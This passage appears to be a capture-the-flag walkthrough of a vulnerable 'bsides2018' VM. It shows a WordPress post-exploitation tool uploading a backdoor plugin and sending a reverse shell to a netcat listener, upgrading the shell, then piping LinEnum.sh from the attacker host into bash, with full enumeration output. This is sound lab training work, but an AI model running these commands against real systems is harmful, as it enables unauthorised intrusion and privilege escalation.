usage: yertle.py [-h] [-i] [-r] -t TARGET [-u USERNAME] [-p PASSWORD]
                 [-a AGENT] [-li IP] [-lp PORT] [-v] [-e EXISTING]

This a post-exploitation module for Wordpress

optional arguments:
  -h, --help            show this help message and exit
  -i, --interactive     Interactive command shell
  -r, --reverse         Reverse Shell
  -t TARGET, --target TARGET
                        URL of target
  -u USERNAME, --username USERNAME
                        Admin username
  -p PASSWORD, --password PASSWORD
                        Admin password
  -a AGENT, --agent AGENT
                        Custom User Agent
  -li IP, --ip IP       Listener IP
  -lp PORT, --port PORT
                        Listener Port
  -v, --verbose         Verbose output.
  -e EXISTING, --existing EXISTING
                        Skips uploading a shell, and connects to existing
                        shell
root@kali:~/bsides/WPForce#
```

```sh
root@kali:~/bsides/WPForce# python yertle.py --target http://192.168.150.18/backup_wordpress/ --username john --password enigma --ip 192.168.150.19 --port 1337 --reverse --verbose
     _..---.--.    __   __        _   _
   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
 (____.'.-_\____)    | |  __/ |  | |_| |  __/
  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
   (_..)--(.._)'--'         ~n00py~
      Post-exploitation Module for Wordpress
                     v.1.1.0

Server Header: Apache/2.2.22 (Ubuntu)
Found Login Page
Logged in as Admin
Found CSRF Token: 970fc1f2f6
Backdoor uploaded!
Plugin installed successfully
Upload Directory: vzmchkq
Sending reverse shell to 192.168.150.19 port 1337
```

[`Upgrading simple shells to fully interactive TTYs`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method1pythonptymodule)

```sh
root@kali:~# nc -nlvp 1337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.150.18.
Ncat: Connection from 192.168.150.18:44235.
Linux bsides2018 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
 14:19:55 up 31 min,  0 users,  load average: 20.33, 18.51, 11.11
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bsides2018:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bsides2018:/$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bsides2018:/$ ^Z
[1]+  Stopped                 nc -nlvp 1337
root@kali:~# echo $TERM
xterm-256color
root@kali:~# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~# stty raw -echo
root@kali:~# nc -nlvp 1337
                          reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

www-data@bsides2018:/$ export SHELL=bash
www-data@bsides2018:/$ export TERM=xterm256-color
www-data@bsides2018:/$ stty rows 51 columns 204
www-data@bsides2018:/$
```

###### Privilege Escalation

```sh
root@kali:~/bsides# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2018-07-02 17:23:26--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 44413 (43K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  43.37K  --.-KB/s    in 0.05s

2018-07-02 17:23:26 (951 KB/s) - ‘LinEnum.sh’ saved [44413/44413]

root@kali:~/bsides#
```

```sh
root@kali:~/bsides# head LinEnum.sh
#!/bin/bash
#A script to enumerate local information from a Linux host
version="version 0.91"
#@rebootuser

thorough=1

#help function
usage ()
{
root@kali:~/bsides#
```

```sh
root@kali:~/bsides# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.150.18 - - [02/Jul/2018 17:25:11] "GET /LinEnum.sh HTTP/1.1" 200 -
```

```sh
www-data@bsides2018:/$ curl http://192.168.150.19/LinEnum.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 44425  100 44425    0     0  2077k      0 --:--:-- --:--:-- --:--:-- 2169k

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.91

[-] Debug Info
[+] Thorough tests = Enabled


Scan started at:
Mon Jul  2 14:30:58 PDT 2018


### SYSTEM ##############################################
[-] Kernel information:
Linux bsides2018 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux


[-] Kernel information (continued):
Linux version 3.11.0-15-generic (buildd@akateko) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04.4 LTS"
NAME="Ubuntu"
VERSION="12.04.4 LTS, Precise Pangolin"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu precise (12.04.4 LTS)"
VERSION_ID="12.04"


[-] Hostname:
bsides2018


### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
abatchy          tty1                      Wed Mar  7 11:49:38 -0800 2018
anne             pts/2    192.168.1.68     Sun Mar  4 16:14:55 -0800 2018


[-] Who else is logged on:
 14:30:58 up 42 min,  0 users,  load average: 8.18, 16.36, 14.39
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
uid=101(syslog) gid=103(syslog) groups=103(syslog)
uid=102(messagebus) gid=105(messagebus) groups=105(messagebus)
uid=103(colord) gid=108(colord) groups=108(colord)
uid=104(lightdm) gid=111(lightdm) groups=111(lightdm)
uid=105(whoopsie) gid=114(whoopsie) groups=114(whoopsie)
uid=106(avahi-autoipd) gid=117(avahi-autoipd) groups=117(avahi-autoipd)
uid=107(avahi) gid=118(avahi) groups=118(avahi)
uid=108(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=109(kernoops) gid=65534(nogroup) groups=65534(nogroup)
uid=110(pulse) gid=119(pulse) groups=119(pulse),29(audio)
uid=111(rtkit) gid=122(rtkit) groups=122(rtkit)
uid=112(speech-dispatcher) gid=29(audio) groups=29(audio)
uid=113(hplip) gid=7(lp) groups=7(lp)
uid=114(saned) gid=123(saned) groups=123(saned)
uid=1000(abatchy) gid=1000(abatchy) groups=1000(abatchy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
uid=115(mysql) gid=125(mysql) groups=125(mysql)
uid=116(ftp) gid=126(ftp) groups=126(ftp)
uid=1001(john) gid=1001(john) groups=1001(john)
uid=1002(mai) gid=1002(mai) groups=1002(mai)
uid=1003(anne) gid=1003(anne) groups=1003(anne),27(sudo)
uid=1004(doomguy) gid=1004(doomguy) groups=1004(doomguy)
uid=117(sshd) gid=65534(nogroup) groups=65534(nogroup)


[-] It looks like we have some admin users:
uid=1000(abatchy) gid=1000(abatchy) groups=1000(abatchy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
abatchy:x:1000:1000:abatchy,,,:/home/abatchy:/bin/bash
mysql:x:115:125:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:116:126:ftp daemon,,,:/srv/ftp:/bin/false
john:x:1001:1001:,,,:/home/john:/bin/bash
mai:x:1002:1002:,,,:/home/mai:/bin/bash
anne:x:1003:1003:,,,:/home/anne:/bin/bash
doomguy:x:1004:1004:,,,:/home/doomguy:/bin/bash
sshd:x:117:65534::/var/run/sshd:/usr/sbin/nologin


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 28K
drwxr-xr-x  7 root    root    4.0K Mar  4 18:09 .
drwxr-xr-x 23 root    root    4.0K Mar  3 11:09 ..
drwxr-xr-x 19 abatchy abatchy 4.0K Mar  7 12:17 abatchy
drwxr-xr-x  2 anne    anne    4.0K Mar  4 18:09 anne
drwxr-xr-x  2 doomguy doomguy 4.0K Mar  3 16:56 doomguy
drwxr-xr-x  2 john    john    4.0K Mar  3 16:54 john
drwxr-xr-x  2 mai     mai     4.0K Mar  3 16:55 mai


[-] Files not owned by user but writable by group:
-rwxrwxrwx 1 root root 64 Mar  3 16:13 /usr/local/bin/cleanup


[-] Files owned by our user:
-rwxr-xr-x 1 www-data www-data 2930 Mar  7 11:55 /var/www/backup_wordpress/wp-config.php
-rw-r--r-- 1 www-data www-data 3316 Nov  5  2015 /var/www/backup_wordpress/wp-load.php
-rw-r--r-- 1 www-data www-data 2853 Dec 16  2015 /var/www/backup_wordpress/wp-config-sample.php
-rw-r--r-- 1 www-data www-data 28624 Jan 27  2016 /var/www/backup_wordpress/wp-signup.php
-rw-r--r-- 1 www-data www-data 18092 Aug 23  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/LICENSE.txt
-rw-r--r-- 1 www-data www-data 2719 Mar 20  2014 /var/www/backup_wordpress/wp-content/plugins/akismet/class.akismet-widget.php
-rw-r--r-- 1 www-data www-data 39526 Jan  6  2016 /var/www/backup_wordpress/wp-content/plugins/akismet/class.akismet-admin.php
-rw-r--r-- 1 www-data www-data 45860 Mar 31  2016 /var/www/backup_wordpress/wp-content/plugins/akismet/class.akismet.php
-rw-r--r-- 1 www-data www-data 551 Apr 14  2014 /var/www/backup_wordpress/wp-content/plugins/akismet/views/stats.php
-rw-r--r-- 1 www-data www-data 595 Sep  8  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/views/get.php
-rw-r--r-- 1 www-data www-data 8697 Dec 26  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/views/notice.php
-rw-r--r-- 1 www-data www-data 6547 Sep  8  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/views/start.php
-rw-r--r-- 1 www-data www-data 761 Sep 23  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/views/strict.php
-rw-r--r-- 1 www-data www-data 10682 Dec 11  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/views/config.php
-rw-r--r-- 1 www-data www-data 616 Nov 19  2014 /var/www/backup_wordpress/wp-content/plugins/akismet/.htaccess
-rw-r--r-- 1 www-data www-data 2379 Apr  1  2016 /var/www/backup_wordpress/wp-content/plugins/akismet/akismet.php
-rw-r--r-- 1 www-data www-data 13394 Apr  1  2016 /var/www/backup_wordpress/wp-content/plugins/akismet/readme.txt
-rw-r--r-- 1 www-data www-data 6427 Mar 17  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/wrapper.php
-rw-r--r-- 1 www-data www-data 8748 Dec 26  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/_inc/akismet.css
-rw-r--r-- 1 www-data www-data 700 Jul  2  2014 /var/www/backup_wordpress/wp-content/plugins/akismet/_inc/form.js
-rw-r--r-- 1 www-data www-data 4970 Mar 10  2014 /var/www/backup_wordpress/wp-content/plugins/akismet/_inc/img/logo-full-2x.png
-rw-r--r-- 1 www-data www-data 6295 Dec 26  2015 /var/www/backup_wordpress/wp-content/plugins/akismet/_inc/akismet.js
-rw-r--r-- 1 www-data www-data 26 Mar 10  2014 /var/www/backup_wordpress/wp-content/plugins/akismet/index.php
-rw-r--r-- 1 www-data www-data 5839 Jul  2 14:19 /var/www/backup_wordpress/wp-content/plugins/nnafrim/reverse.php
-rw-r--r-- 1 www-data www-data 2255 May 22  2013 /var/www/backup_wordpress/wp-content/plugins/hello.php
-rw-r--r-- 1 www-data www-data 5839 Jul  2 14:19 /var/www/backup_wordpress/wp-content/plugins/vzmchkq/reverse.php
-rw-r--r-- 1 www-data www-data 28 Jun  5  2014 /var/www/backup_wordpress/wp-content/plugins/index.php
-rw-r--r-- 1 www-data www-data 1753 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/content-link.php
-rw-r--r-- 1 www-data www-data 1101 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/content-search.php
-rw-r--r-- 1 www-data www-data 12755 Mar 23  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/functions.php
-rw-r--r-- 1 www-data www-data 2915 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/js/color-scheme-control.js
-rw-r--r-- 1 www-data www-data 832 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/js/customize-preview.js
-rw-r--r-- 1 www-data www-data 487 Dec 10  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/js/keyboard-image-navigation.js
-rw-r--r-- 1 www-data www-data 727 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js
-rw-r--r-- 1 www-data www-data 5920 Mar 15  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/js/functions.js
-rw-r--r-- 1 www-data www-data 2432 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/js/html5.js
-rw-r--r-- 1 www-data www-data 1141 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/author-bio.php
-rw-r--r-- 1 www-data www-data 1166 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/content-none.php
-rw-r--r-- 1 www-data www-data 1528 Dec 12  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/single.php
-rw-r--r-- 1 www-data www-data 18092 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/LICENSE.txt
-rw-r--r-- 1 www-data www-data 22760 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/Genericons.eot
-rw-r--r-- 1 www-data www-data 1424 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/COPYING.txt
-rw-r--r-- 1 www-data www-data 78913 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/Genericons.svg
-rw-r--r-- 1 www-data www-data 6569 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/README.md
-rw-r--r-- 1 www-data www-data 14360 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/Genericons.woff
-rw-r--r-- 1 www-data www-data 27519 Dec 10  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/genericons.css
-rw-r--r-- 1 www-data www-data 22576 Oct 14  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons/Genericons.ttf
-rw-r--r-- 1 www-data www-data 9431 Jul  6  2015 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/inc/custom-header.php
-rw-r--r-- 1 www-data www-data 8304 Mar 10  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/inc/template-tags.php
-rw-r--r-- 1 www-data www-data 21461 Mar  1  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/inc/customizer.php
-rw-r--r-- 1 www-data www-data 2165 Nov 25  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/inc/back-compat.php
-rw-r--r-- 1 www-data www-data 1313 Nov 19  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/sidebar.php
-rw-r--r-- 1 www-data www-data 1405 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/search.php
-rw-r--r-- 1 www-data www-data 1473 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/comments.php
-rw-r--r-- 1 www-data www-data 5757 Dec 23  2015 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/css/editor-style.css
-rw-r--r-- 1 www-data www-data 1159 Dec 10  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/css/ie7.css
-rw-r--r-- 1 www-data www-data 14133 Jan 15  2015 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/css/ie.css
-rw-r--r-- 1 www-data www-data 809 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/404.php
-rw-r--r-- 1 www-data www-data 576231 Mar 18  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/screenshot.png
-rw-r--r-- 1 www-data www-data 97760 Apr  8  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/style.css
-rw-r--r-- 1 www-data www-data 2940 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/image.php
-rw-r--r-- 1 www-data www-data 3251 Apr  8  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/readme.txt
-rw-r--r-- 1 www-data www-data 823 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/footer.php
-rw-r--r-- 1 www-data www-data 1914 Dec 11  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/archive.php
-rw-r--r-- 1 www-data www-data 12384 Sep 26  2015 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/rtl.css
-rw-r--r-- 1 www-data www-data 1765 Dec 11  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/index.php
-rw-r--r-- 1 www-data www-data 1117 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/content-page.php
-rw-r--r-- 1 www-data www-data 1702 Dec 16  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/content.php
-rw-r--r-- 1 www-data www-data 1846 Mar  9  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/header.php
-rw-r--r-- 1 www-data www-data 7091 Apr  8  2016 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/languages/twentyfifteen.pot
-rw-r--r-- 1 www-data www-data 902 Nov 19  2014 /var/www/backup_wordpress/wp-content/themes/twentyfifteen/page.php
-rw-r--r-- 1 www-data www-data 340 Nov 18  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/sidebar-content.php
-rw-r--r-- 1 www-data www-data 2305 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-link.php
-rw-r--r-- 1 www-data www-data 16536 Mar 21  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/functions.php
-rw-r--r-- 1 www-data www-data 18801 Jan 20  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/js/slider.js
-rw-r--r-- 1 www-data www-data 950 Oct 15  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/js/customizer.js
-rw-r--r-- 1 www-data www-data 329 Dec  5  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/js/featured-content-admin.js
-rw-r--r-- 1 www-data www-data 497 Jan 20  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/js/keyboard-image-navigation.js
-rw-r--r-- 1 www-data www-data 6042 Mar 21  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/js/functions.js
-rw-r--r-- 1 www-data www-data 2428 Feb 25  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/js/html5.js
-rw-r--r-- 1 www-data www-data 1537 Apr 12  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/category.php
-rw-r--r-- 1 www-data www-data 2314 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-gallery.php
-rw-r--r-- 1 www-data www-data 945 Jan 20  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/featured-content.php
-rw-r--r-- 1 www-data www-data 2308 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-image.php
-rw-r--r-- 1 www-data www-data 395 Nov 18  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/sidebar-footer.php
-rw-r--r-- 1 www-data www-data 2308 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-audio.php
-rw-r--r-- 1 www-data www-data 2308 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-quote.php
-rw-r--r-- 1 www-data www-data 1928 Apr 12  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/author.php
-rw-r--r-- 1 www-data www-data 961 Oct 11  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-none.php
-rw-r--r-- 1 www-data www-data 1033 Dec  3  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/single.php
-rw-r--r-- 1 www-data www-data 1176 Nov 19  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/images/pattern-dark.svg
-rw-r--r-- 1 www-data www-data 540 Oct 30  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/images/pattern-light.svg
-rw-r--r-- 1 www-data www-data 18092 Nov 12  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/LICENSE.txt
-rw-r--r-- 1 www-data www-data 18212 Jun  6  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/Genericons-Regular.otf
-rw-r--r-- 1 www-data www-data 1424 Nov 12  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/COPYING.txt
-rw-r--r-- 1 www-data www-data 5896 Jun  6  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/README.txt
-rw-r--r-- 1 www-data www-data 40045 Jun  6  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.svg
-rw-r--r-- 1 www-data www-data 27348 Jun  6  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.ttf
-rw-r--r-- 1 www-data www-data 17224 Jun  6  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.woff
-rw-r--r-- 1 www-data www-data 14935 Jun  6  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/font/genericons-regular-webfont.eot
-rw-r--r-- 1 www-data www-data 31045 Jun  6  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/genericons.css
-rw-r--r-- 1 www-data www-data 1123 Dec  5  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-featured-post.php
-rw-r--r-- 1 www-data www-data 1296 Dec  3  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/page-templates/contributors.php
-rw-r--r-- 1 www-data www-data 939 Dec  3  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/page-templates/full-width.php
-rw-r--r-- 1 www-data www-data 2308 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-video.php
-rw-r--r-- 1 www-data www-data 4519 Jan 20  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/inc/custom-header.php
-rw-r--r-- 1 www-data www-data 7224 Feb 20  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/inc/template-tags.php
-rw-r--r-- 1 www-data www-data 15187 Feb 25  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/inc/featured-content.php
-rw-r--r-- 1 www-data www-data 6635 Mar  1  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/inc/customizer.php
-rw-r--r-- 1 www-data www-data 2189 Oct 15  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/inc/back-compat.php
-rw-r--r-- 1 www-data www-data 10615 Mar 21  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/inc/widgets.php
-rw-r--r-- 1 www-data www-data 848 Nov 27  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/sidebar.php
-rw-r--r-- 1 www-data www-data 1231 Dec  3  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/search.php
-rw-r--r-- 1 www-data www-data 2308 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-aside.php
-rw-r--r-- 1 www-data www-data 2317 Jan 20  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/comments.php
-rw-r--r-- 1 www-data www-data 1594 Apr 12  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/tag.php
-rw-r--r-- 1 www-data www-data 11679 Jul 25  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/css/editor-style.css
-rw-r--r-- 1 www-data www-data 24683 Jul 11  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/css/ie.css
-rw-r--r-- 1 www-data www-data 719 Dec  5  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/404.php
-rw-r--r-- 1 www-data www-data 933301 Mar 18  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/screenshot.png
-rw-r--r-- 1 www-data www-data 77429 Apr  8  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/style.css
-rw-r--r-- 1 www-data www-data 2703 Jan 20  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/image.php
-rw-r--r-- 1 www-data www-data 3461 Apr  8  2016 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/readme.txt
-rw-r--r-- 1 www-data www-data 729 Apr 27  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/footer.php
-rw-r--r-- 1 www-data www-data 2162 Apr 12  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/archive.php
-rw-r--r-- 1 www-data www-data 15579 Apr 27  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/rtl.css
-rw-r--r-- 1 www-data www-data 2365 Apr 12  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/taxonomy-post_format.php
-rw-r--r-- 1 www-data www-data 1580 Apr 12  2015 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/index.php
-rw-r--r-- 1 www-data www-data 871 Dec  3  2013 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content-page.php
-rw-r--r-- 1 www-data www-data 2325 Dec  9  2014 /var/www/backup_wordpress/wp-content/themes/twentyfourteen/content.php
